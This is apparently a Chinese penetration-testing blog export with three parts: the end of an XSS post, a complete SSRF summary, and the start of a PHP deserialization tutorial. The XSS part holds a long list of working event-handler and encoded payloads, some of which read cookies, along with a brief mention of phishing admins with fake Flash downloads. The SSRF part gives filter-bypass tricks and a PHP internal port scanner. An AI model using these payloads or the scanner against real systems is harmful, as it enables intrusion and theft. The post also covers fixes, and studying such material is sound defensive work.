<h3 id="绕过过滤规则"><a href="#绕过过滤规则" class="headerlink" title="绕过过滤规则"></a>绕过过滤规则</h3><p>大小写混用：<code>&lt;iMgSRC = &quot;JavaScript:alert(0);&quot;&gt;</code></p>
<p>不使用引号或者构造全角字符也能扰乱过滤规则</p>
<p>还有像CSS中/**/会被浏览器忽略，\和\0同样或被浏览器忽略，同样可以用来绕过：</p>
<p><code>&lt;img src =&quot;java/*javascript:alert(&#39;xss&#39;)*/script:alert(1);&quot;&gt;</code></p>
<h3 id="充分利用字符编码"><a href="#充分利用字符编码" class="headerlink" title="充分利用字符编码"></a>充分利用字符编码</h3><p>上面说到过编码，这里加以补充，除了像&#ASCII，其实也可以采用&#0、&#00、&#000等形式，同样&#x6a的形式也是可以的</p>
<p><code>&lt;script&gt;eval(&quot;\61\6c\65......&quot;);&lt;script&gt;</code></p>
<p>如果使用eval执行10进制形式的脚本则需要配合string.fromcharcode()使用</p>
<h3 id="拆分跨站法"><a href="#拆分跨站法" class="headerlink" title="拆分跨站法"></a>拆分跨站法</h3><p>拆分跨站就是像shellcode一样，遇到长度限制不能按正常方式跨站时，通过引入变量多次提交将之连接起来实现跨站，例如：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;z=‘<span class="built_in">document</span>.‘&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;script&gt;z=+'write'("''&lt;/</span>script&gt;</span><br><span class="line">&lt;script&gt;z=z+<span class="string">''</span>&lt;script<span class="string">'&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
<p>......</p>
<p><code>&lt;script&gt;eval(z)&lt;/script&gt;</code><br>另外除了像上面多次提交，也可以引用其他变量如：eval(qUserInfo.spaceName)形式，由于qUserInfo.spaceName是可控变量，因此改变其值就可以绕过长度限制了</p>
<h2 id="0x05-一些Payload"><a href="#0x05-一些Payload" class="headerlink" title="0x05 一些Payload"></a>0x05 一些Payload</h2><p>这里放一些由事件触发的payload 自己拿这些事件做了下实验还是挺好玩的 </p>
<p>FUZZ思路就是选弹框不一样payload直接全放进去一般指富文本编辑器或者留言框 其他的就用爆破把 注意线程就好了</p>
<p>还有要强力推荐一下<a href="https://github.com/firesunCN/BlueLotus_XSSReceiver" target="_blank" rel="noopener">BlueLotus_XSS</a>平台 dockerfile很方便 平台很好用 里面有一部分payload模板也可以自己去写一些模板然后生成js文件 </p>
<p>一些网上也提供xss平台 他们有大量的payload而且服务器是一直开着的对我们盲打xss有很大的优势</p>
<p>还有一个flash钓鱼 伪造flash页面一些管理员安全意识不强会进入钓鱼页面 下载我们伪造的文件 直接上线主机 远控一般用CS</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">其实所有经过Unicode编码的payload都不需要双引号和分号就可以执行 而转化为ascii转化为十六进制后就不行</span><br><span class="line"></span><br><span class="line">引号过滤绕过</span><br><span class="line">&lt;script&gt;eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34,41))&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">img标签</span><br><span class="line">&lt;img STYLE=&quot;background-image:url(javascript:alert(&apos;CSS&apos;))&quot;&gt; //版本，E7.0|IE6.0，才能执行</span><br><span class="line">&lt;img STYLE=&quot;background-image:\75\72\6c\28\6a\61\76\61\73\63\72\69\70\74\3a\61\6c\65\72\74\28\27\58\53\53\27\29\29&quot;&gt;   //版本，E7.0|IE6.0，才能执行</span><br><span class="line">&lt;img src=javascript:alert(&apos;xss&apos;)&gt;//版本，E7.0|IE6.0，才能执行</span><br><span class="line">&lt;img src=x onerror=alert(&apos;xss&apos;)&gt; //全版本通用</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt; //可以不加&quot;和;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=eval(&quot;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&quot;)&gt;&lt;/img&gt;  //必须要有双引号，不然执行不了</span><br><span class="line">&lt;img src=&quot;https://melons.top/images/hexo-inverted.svg&quot; onload=alert(&apos;xss&apos;)&gt;  //当src为正常图片加载出来的时候会加载onload属性</span><br><span class="line">&lt;img src=&quot;x&quot; onmousedown=alert(&apos;xss&apos;)&gt;  //点击图片触发</span><br><span class="line">&lt;img src=&quot;x&quot; onmousemove=alert(&apos;xss&apos;) style=&quot;width:100%;height:100%;&quot;&gt; //鼠标在图片上移动触发</span><br><span class="line">&lt;img src=1 onmouseover=alert(&apos;xss&apos;) style=&quot;width:100%;height:100%;&quot;&gt; //鼠标进入图片触发</span><br><span class="line">&lt;img src=1 onmouseout=alert(&apos;xss&apos;)&gt; //鼠标离开图片触发</span><br><span class="line">&lt;img src=1 onmouseup=alert(&apos;xss&apos;) style=&quot;width:100%;height:100%;&quot;&gt; //在图片上释放鼠标事件执行 点击一下两个事件 获取 释放 后者事件满足则触发</span><br><span class="line">&lt;img src=1 onmousewheel=alert(&apos;xss&apos;) style=&quot;width:100%;height:100%;&quot;&gt;  //在图片上滚动 可以使用style写css覆盖当前页面</span><br><span class="line"></span><br><span class="line">video标签下</span><br><span class="line">&lt;video src=&quot;https://melons.top//images/ocean/ocean.mp4&quot; oncanplay=alert(1)&gt; //当文件就绪可以开始播放时运行的脚本</span><br><span class="line">&lt;video src=&quot;https://melons.top//images/ocean/ocean.mp4&quot; ondurationchange=alert(2)&gt; //当媒介长度改变时运行的脚本。</span><br><span class="line">&lt;video src=&quot;x&quot; onerror=alert(2)&gt;</span><br><span class="line">&lt;video src=&quot;https://melons.top//images/ocean/ocean.mp4&quot; onloadeddata=alert(2)&gt; //当媒介数据已加载时运行的脚本</span><br><span class="line">&lt;video src=&quot;https://melons.top//images/ocean/ocean.mp4&quot; onloadedmetadata=alert(2)&gt; //当元数据（比如分辨率和时长）被加载时运行的脚本</span><br><span class="line">&lt;video src=&quot;https://melons.top//images/ocean/ocean.mp4&quot; onloadstart=alert(123)&gt; //当媒介数据开始加载时运行的脚本</span><br><span class="line"></span><br><span class="line">a标签下</span><br><span class="line">&lt;a href=&quot;javascript:alert(&apos;a标签xss&apos;)&quot;&gt;a标签xss&lt;/a&gt;</span><br><span class="line">&lt;a href=javascript:eval(&quot;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&quot;)&gt;a标签xss2&lt;/a&gt; //不可以去双引号</span><br><span class="line">&lt;a href=javascript:eval(&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#120;&amp;#115;&amp;#115;&amp;#39;&amp;#41;&quot;)&gt;a标签xss3&lt;/a&gt; //可以去双引号</span><br><span class="line">&lt;a href=&quot;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&quot;&gt;a标签xss4&lt;/a&gt; //可以去双引号</span><br><span class="line">&lt;a href=&quot;data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==&quot;&gt;test&lt;/a&gt; //无反应 但在地址栏中输入base64会弹框会弹窗</span><br><span class="line">&lt;a href=&quot;&quot; onclick=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt;aaaaa&lt;/a&gt; //可以去掉双引号</span><br><span class="line">&lt;a href=&quot;&quot; onclick=eval(&quot;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&quot;)&gt;aaaaa&lt;/a&gt; </span><br><span class="line">&lt;a href=&quot;&quot; onclick=eval(&apos;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&apos;)&gt;aaaaa&lt;/a&gt; </span><br><span class="line"></span><br><span class="line">input标签下</span><br><span class="line">&lt;input value=&quot;&quot; onclick=&quot;alert(document.cookie)&quot; type=&quot;text&quot;&gt; //点击输入框时触发</span><br><span class="line">&lt;INPUT name=&quot;name&quot; value=&quot;&quot;&gt;&lt;script&gt;alert(123)&lt;/script&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;name&quot; onmouseover=prompt(document.cookie) style=&quot;width:100%;height:100%;&quot;&gt; </span><br><span class="line"></span><br><span class="line">span标签下</span><br><span class="line">&lt;span id=&quot;span&quot;  recieveurl=&apos;xxxeId=1&apos; accesskey=&apos;X&apos; onclick=&apos;alert(/xss/)&apos; bad=&apos;&apos;&gt;&lt;/span&gt; //alt+shift+x 触发 感觉很鸡肋</span><br><span class="line"></span><br><span class="line">iframe标签下</span><br><span class="line">&lt;iframe src=javascript:alert(&apos;xss&apos;); height=0 width=0 style=&quot;border:0px;&quot;/&gt;&lt;iframe&gt; //设置好css可以完美隐藏</span><br><span class="line">&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot; height=0 width=0 style=&quot;border:0px;&quot;/&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe src=&quot;data:text/html,&amp;lt;script&amp;gt;alert`1`&amp;lt;/script&amp;gt;&quot; height=0 width=0 style=&quot;border:0px;&quot;/&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe src=&quot;http://www.baidu.com&quot; onmouseover=alert(&apos;xss&apos;) height=100%0 width=100% style=&quot;border:0px;position: absolute;top:0px;left:0px;&quot;/&gt;&lt;iframe&gt; //css使用绝对定位覆盖全部撑开</span><br><span class="line">&lt;iframe src=&quot;javascript&amp;colon;prompt&amp;lpar;`xss`&amp;rpar;;&quot; frameborder=&quot;0&quot; width=&quot;100%&quot; height=&quot;1120px&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>漏洞挖掘</tag>
        <tag>xss</tag>
        <tag>html</tag>
      </tags>
  </entry>
  <entry>
    <title>SSRF总结</title>
    <url>/2019/12/15/SSRF/</url>
    <content><![CDATA[<p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>
<a id="more"></a>

<h2 id="0x00-概念"><a href="#0x00-概念" class="headerlink" title="0x00 概念"></a>0x00 概念</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>
<p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p>
<p>注释：除了http/https等方式可以造成ssrf，类似tcp connect 方式也可以探测内网一些ip 的端口是否开发服务，只不过危害比较小而已。</p>
<h2 id="0x01-可能出现的地方"><a href="#0x01-可能出现的地方" class="headerlink" title="0x01 可能出现的地方"></a>0x01 可能出现的地方</h2><p>1.社交分享功能：获取超链接的标题等内容进行显示</p>
<p>2.转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</p>
<p>3.在线翻译：给网址翻译对应网页的内容</p>
<p>4.图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</p>
<p>5.图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验</p>
<p>6.云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</p>
<p>7.网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</p>
<p>8.数据库内置功能：数据库的比如<code>mongodb</code>的<code>copyDatabase</code>函数</p>
<p>9.邮件系统：比如接收邮件服务器地址</p>
<p>10.编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</p>
<p>11.未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞</p>
<p>一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</p>
<p>12.从远程服务器请求资源（upload from url 如discuz!;  import &amp; expost rss feed 如web blog;  使用了xml引擎对象的地方 如wordpress xmlrpc.php）</p>
<p>13.WebHooks：寻找触发特定事件时发出http请求的服务。在大多数WebHooks的功能中，终端用户可以选择他们的终端点和主机名。尝试向内部服务发送http请求。</p>
<p>14.PDF生成器：试着注入指向内部服务的<code>&lt;iframe&gt;,&lt;img&gt;,&lt;base&gt;</code>或者<code>&lt;script&gt;</code>元素或者CSS的<code>url()</code>函数。</p>
<p>15.文档解析器：尝试了解文档是如何被解析的。如果是XML文档，那就是用了PDF生成器方法。对于其他文档，检查是否存在引用外部资源的方法然后通过服务器向内部服务发送请求。</p>
<p>16.链接扩展: 最近<a href="https://twitter.com/BugBountyHQ/status/868242771617792000" target="_blank" rel="noopener">Mark Litchfield在推特扩展链接上发现了漏洞</a>，名声大涨。</p>
<p>17.文件上传：与常规上传文件相反，尝试发送url请求然后检查是否下载了url的内容。<a href="https://hackerone.com/reports/713" target="_blank" rel="noopener">例子</a></p>
<h2 id="0x02-漏洞验证"><a href="#0x02-漏洞验证" class="headerlink" title="0x02 漏洞验证"></a>0x02 漏洞验证</h2><p>1.排除法：浏览器f12查看源代码看是否是在本地进行了请求。</p>
<p>比如：该资源地址类型为 <code>http://www.xxx.com/a.php?image=(地址)</code>的就可能存在SSRF漏洞。</p>
<p>2.dnslog等工具进行测试，看是否被访问。</p>
<ul>
<li>可以在盲打后台用例中将当前准备请求的uri 和参数编码成base64，这样盲打后台解码后就知道是哪台机器哪个cgi触发的请求。</li>
</ul>
<p>3.抓包分析发送的请求是不是由服务器的发送的，如果不是客户端发出的请求，则有可能是，接着找存在HTTP服务的内网地址。</p>
<ul>
<li><p>从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址</p>
</li>
<li><p>通过二级域名暴力猜解工具模糊猜测内网地址。</p>
</li>
</ul>
<p>4.直接返回的Banner、title、content等信息。</p>
<p>5.留意bool型SSRF</p>
<h2 id="0x03-一些利用方式"><a href="#0x03-一些利用方式" class="headerlink" title="0x03 一些利用方式"></a>0x03 一些利用方式</h2><p>1.让服务端去访问相应的网址 比如在自己的服务器上监听端口然后在url让他去请求我们的服务器</p>
<p>2.让服务端去访问自己所处内网的一些指纹文件来判断是否存在相应的cms</p>
<p>3.可以使用file、dict、gopher[11]、ftp协议进行请求访问相应的文件</p>
<p>4.攻击内网web应用（可以向内部任意主机的任意端口发送精心构造的数据包{payload}）</p>
<p>5.攻击内网应用程序（利用跨协议通信技术）</p>
<p>6.判断内网主机是否存活：方法是访问看是否有端口开放</p>
<p>某些时候SSRF漏洞可以用作局域网内的端口扫描。这有助于理清内网的基础设施轮廓和并为下一步其他漏洞的利用做铺垫。上述这种情况通常是最简单的blind SSRF了。如果之前的脚本无法建立连接或收不到服务器响应，异常将被抛出。利用这个特征可以识别端口是否开放（连接建立）或关闭（连接失败或超时）。</p>
<h2 id="0x04-绕过小技巧"><a href="#0x04-绕过小技巧" class="headerlink" title="0x04 绕过小技巧"></a>0x04 绕过小技巧</h2><p>1.<a href="http://baidu.com@www.baidu.com/与http://www.baidu.com/请求时是相同的" target="_blank" rel="noopener">http://baidu.com@www.baidu.com/与http://www.baidu.com/请求时是相同的</a></p>
<p>2.各种IP地址的进制转换</p>
<p>3.URL跳转绕过：<a href="http://www.hackersb.cn/redirect.php?url=http://192.168.0.1/" target="_blank" rel="noopener">http://www.hackersb.cn/redirect.php?url=http://192.168.0.1/</a></p>
<p>4.短网址绕过 <a href="http://t.cn/RwbLKDx" target="_blank" rel="noopener">http://t.cn/RwbLKDx</a></p>
<p>5.xip.io来绕过：<a href="http://192.168.0.1.xip.io/" target="_blank" rel="noopener">http://192.168.0.1.xip.io/</a> == 192.168.0.1 </p>
<p>6.限制了子网段，可以加 :80 端口绕过。<a href="http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.42.7.78:80" target="_blank" rel="noopener">http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.42.7.78:80</a></p>
<p>7.探测内网域名，或者将自己的域名解析到内网ip</p>
<p>8.例如 <a href="http://10.153.138.81/ts.php" target="_blank" rel="noopener">http://10.153.138.81/ts.php</a> , 修复时容易出现的获取host时以/分割来确定host，</p>
<p>但这样可以用 <a href="http://abc@10.153.138.81/" target="_blank" rel="noopener">http://abc@10.153.138.81/</a> 绕过</p>
<h2 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05 漏洞修复"></a>0x05 漏洞修复</h2><p>1.禁止跳转</p>
<p>2.过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p>
<p>3.禁用不需要的协议，仅仅允许http和https请求。可以防止类似于file://, gopher://, ftp:// 等引起的问题</p>
<p>4.设置URL白名单或者限制内网IP（使用gethostbyname()判断是否为内网IP）</p>
<p>5.限制请求的端口为http常用的端口，比如 80、443、8080、8090</p>
<p>6.统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p>
<h2 id="0x06-漏洞利用中牵涉的小技巧"><a href="#0x06-漏洞利用中牵涉的小技巧" class="headerlink" title="0x06 漏洞利用中牵涉的小技巧"></a>0x06 漏洞利用中牵涉的小技巧</h2><p>crontab -l 显示当前计划任务</p>
<p>crontab -r 清除当前计划任务</p>
<p>端口转发工具 socat</p>
<p>在Apache配置文件中写入下面的内容，就可以将jpg文件当做PHP文件来执行</p>
<p>AddType application/x-httpd-php .jpg<br>……</p>
<p>常用的探测内网地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.0.0.0/8 127.0.0.1/32 172.16.0.0/12 192.168.0.0/16</span><br></pre></td></tr></table></figure>

<p>常用的探测端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">21, 22, 23, 25, 53, 80, 110, 443, 1433, 3306, 3389, 8080, 8443</span><br></pre></td></tr></table></figure>

<h2 id="0x07-举一个栗子"><a href="#0x07-举一个栗子" class="headerlink" title="0x07 举一个栗子"></a>0x07 举一个栗子</h2><p>先说一下关于SSRF的<strong>函数</strong></p>
<p>curl造成的SSRF</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function curl($url)&#123;  </span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">    curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line">$url = $_GET[&apos;url&apos;];</span><br><span class="line">curl($url);</span><br></pre></td></tr></table></figure>

<p>file_get_contents造成的SSRF</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$url = $_GET[&apos;url&apos;];</span><br><span class="line">echo file_get_contents($url);</span><br></pre></td></tr></table></figure>
<p>fsockopen造成的SSRF</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function Getfile($host, $port, $link)&#123;</span><br><span class="line">    $fp = fsockopen($host, intval($port), $errno, $errstr, 30);</span><br><span class="line">    if(!$fp)&#123;</span><br><span class="line">        echo &quot;$errstr (error number $errno) \n&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $out = &quot;GET $link HTTP/1.1\r\n&quot;;</span><br><span class="line">        $out .= &quot;HOST $host \r\n&quot;;</span><br><span class="line">        $out .= &quot;Connection: Close\r\n\r\n&quot;;</span><br><span class="line">        $out .= &quot;\r\n&quot;;</span><br><span class="line">        fwrite($fp, $out);</span><br><span class="line">        $content = &apos;&apos;;</span><br><span class="line">        while(!feof($fp))&#123;</span><br><span class="line">            $contents .= fgets($fp, 1024);</span><br><span class="line">        &#125;</span><br><span class="line">        fclose($fp);</span><br><span class="line">        return $contents;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我们直接使用docker搭建了Bwapp平台做测试 其实本地搭建php就可以</p>
<p>docker使用命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker search bwapp</span><br><span class="line">docker pull raesene/bwapp</span><br><span class="line">docker run -d -p 8080:80 raesene/bwapp</span><br></pre></td></tr></table></figure>

<p>这里我们选择文件包含测试 难度选择low 点击GO</p>
<p><img src="/images/SSRF/bwapp2.png" alt="html">    </p>
<p><img src="/images/SSRF/bwapp1.png" alt="html">    </p>
<p>这时候我们可以看到<code>language</code>参数的值是一个文件 这时候我们用内网探测脚本试一试</p>
<p><img src="/images/SSRF/bwapp3.png" alt="html">    </p>
<p>这里放出内网探测的脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">"ip"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//list of port numbers to scan</span></span><br><span class="line">    $ports = <span class="keyword">array</span>(<span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">53</span>, <span class="number">80</span>, <span class="number">110</span>, <span class="number">1433</span>, <span class="number">3306</span>);</span><br><span class="line">    </span><br><span class="line">    $results = <span class="keyword">array</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">foreach</span>($ports <span class="keyword">as</span> $port)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($pf = @fsockopen($_REQUEST[<span class="string">"ip"</span>], $port, $err, $err_string, <span class="number">1</span>))</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            $results[$port] = <span class="keyword">true</span>;</span><br><span class="line">            fclose($pf);</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            $results[$port] = <span class="keyword">false</span>;        </span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">foreach</span>($results <span class="keyword">as</span> $port=&gt;$val)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        $prot = getservbyport($port,<span class="string">"tcp"</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Port $port ($prot): "</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($val)</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;span style=\"color:green\"&gt;OK&lt;/span&gt;&lt;br/&gt;"</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;span style=\"color:red\"&gt;Inaccessible&lt;/span&gt;&lt;br/&gt;"</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>其实这里是有一个坑的 网上的一些教程说是在bwapp里选择ssrf会提供三个脚本 但是我去docker里找了根本没有这个文件夹 然后又去github上找了这个docker的文件 发现也没有emmm 最后在github上搜到了这个脚本 我把链接贴出来<a href="https://github.com/theand-fork/bwapp-code" target="_blank" rel="noopener">Bwapp 的POC</a></p>
<p>Redis getshll留坑 原先写过 找不到了等重新加到后面吧。</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>漏洞挖掘</tag>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>序列化与反序列化</title>
    <url>/2019/12/14/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>漏洞：通常情况下不影响软件的正常功能，但如果被攻击者利用，有可能驱使软件去执行一些额外的恶意代码，从而引发</p>
<p>内存中的数据对象只有转换成二进制才可以进行数据持久化和网络传输。将数据对象转换成二进制的流程称之为对象的序列化（Serialization）。反之，将二进制流恢复为数据对象的过程称之为反序列化（Deserialization）。序列化需要保留充分的信息以恢复数据对象，但是为了节省存储空间和网络带宽，序列化后的二进制流又要尽可能的小。</p>
<a id="more"></a>

<h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><h2 id="0x00-PHP反序列化原理"><a href="#0x00-PHP反序列化原理" class="headerlink" title="0x00 PHP反序列化原理"></a>0x00 PHP反序列化原理</h2><h3 id="1-PHP序列化与反序列化基础"><a href="#1-PHP序列化与反序列化基础" class="headerlink" title="1.PHP序列化与反序列化基础"></a>1.PHP序列化与反序列化基础</h3><h4 id="1-1-序列化与反序列化"><a href="#1-1-序列化与反序列化" class="headerlink" title="1.1 序列化与反序列化"></a>1.1 序列化与反序列化</h4><p>序列化是将变量转换为可保存或传输字符串的过程。</p>
<p>反序列化就是在适当的时候把这个字符串再转化为原来的变量使用。</p>
<h4 id="1-2PHP序列化与反序列化函数"><a href="#1-2PHP序列化与反序列化函数" class="headerlink" title="1.2PHP序列化与反序列化函数"></a>1.2PHP序列化与反序列化函数</h4><p>Serialize：可以将变量转换为字符串并且在转换中可以保存当前变量的值。</p>
<p>unserialize：可以将Serialize生成的字符串变换回变量。</p>
<p>php进行序列化的目的是保存一个对象方便以后重用。</p>
<h3 id="2-类，变量，方法，对象"><a href="#2-类，变量，方法，对象" class="headerlink" title="2.类，变量，方法，对象"></a>2.类，变量，方法，对象</h3><p>举例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">创建Person类 </span></span><br><span class="line"><span class="comment">变量为name和age </span></span><br><span class="line"><span class="comment">方法为Information</span></span><br><span class="line"><span class="comment">对象为$per</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">		<span class="keyword">public</span> $name = <span class="string">''</span>;</span><br><span class="line">		<span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Information</span><span class="params">()</span></span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'Person:'</span>.<span class="keyword">$this</span>-&gt;name.<span class="string">' is '</span>.<span class="keyword">$this</span>-&gt;age . <span class="string">'years old .&lt;br/&gt;'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;	</span><br><span class="line">	$per = <span class="keyword">new</span> Person();</span><br><span class="line">	$per -&gt; name = <span class="string">'melon'</span>;</span><br><span class="line">	$per -&gt; age = <span class="number">18</span>;</span><br><span class="line">	$per -&gt; Information();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Person1.png" alt="html">    </p>
<h3 id="3-php序列化实例"><a href="#3-php序列化实例" class="headerlink" title="3.php序列化实例"></a>3.php序列化实例</h3><p>serialize()</p>
<p>序列化一个对象将会保存对象的所有变量。但是不会保存对象的方法，只会保存类的名字。</p>
<p>代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">创建Person类 </span></span><br><span class="line"><span class="comment">变量为name和age </span></span><br><span class="line"><span class="comment">方法为Information</span></span><br><span class="line"><span class="comment">对象为$per</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">		<span class="keyword">public</span> $name = <span class="string">''</span>;</span><br><span class="line">		<span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Information</span><span class="params">()</span></span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'Person:'</span>.<span class="keyword">$this</span>-&gt;name.<span class="string">' is '</span>.<span class="keyword">$this</span>-&gt;age . <span class="string">'years old .&lt;br/&gt;'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;	</span><br><span class="line">	$per = <span class="keyword">new</span> Person();</span><br><span class="line">	$per -&gt; name = <span class="string">'melon'</span>;</span><br><span class="line">	$per -&gt; age = <span class="number">18</span>;</span><br><span class="line">	<span class="keyword">echo</span> serialize($per);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Person2.png" alt="html">    </p>
<h3 id="3-php反序列化实例"><a href="#3-php反序列化实例" class="headerlink" title="3.php反序列化实例"></a>3.php反序列化实例</h3><p>unserialize()</p>
<p>unserialize()一个对象，这个对象的类必须已经定义过。</p>
